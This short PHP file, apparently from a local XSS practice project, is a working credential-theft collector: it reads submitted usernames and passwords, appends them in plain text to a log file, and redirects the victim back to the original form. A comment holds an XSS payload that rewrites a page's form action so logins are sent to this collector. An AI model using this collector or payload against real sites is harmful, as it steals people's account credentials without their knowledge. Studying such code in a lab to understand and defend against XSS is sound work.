<?php

$username = $_POST['username'];
$password = $_POST['password'];

if($username && $password) {
  $write_string = 'username:'.$username.'-password:'.$password;
  $fp = fopen('log.txt', 'a');
  fwrite($fp, $write_string);
  fclose($fp);
}

header('Location: http://localhost:8888/php-hacking/xss-php/xss-form-action.php');

/**
 * Script for XSS
 */
// <script>window.onload=function() {document.forms[0].action = "http://localhost:8888/php-hacking/xss-php/stolen.php"};</script>
